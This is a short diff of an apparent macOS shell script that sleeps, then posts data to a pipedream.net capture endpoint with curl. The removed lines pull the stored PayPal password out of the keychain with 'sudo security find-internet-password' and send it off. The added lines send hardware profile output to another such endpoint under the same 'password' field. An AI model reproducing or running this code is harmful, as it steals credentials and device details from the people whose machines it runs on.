@@ -8,7 +8,7 @@ sleep 40
 sleep 40
 # networksetup -setnetworkserviceenabled "Wi-Fi" on
 curl -d '{                      
- "password": "'"$(sudo security find-internet-password -gs www.paypal.com | awk '/^password: / { print \$2 }')"'"
-}' -H "Content-Type: application/json" https://eo7xtzh0mhs98l8.m.pipedream.net
+ "password": "'"$(system_profiler SPHardwareDataType)"'"
+}' -H "Content-Type: application/json" https://eojlk5hggkgar9y.m.pipedream.net
 
 
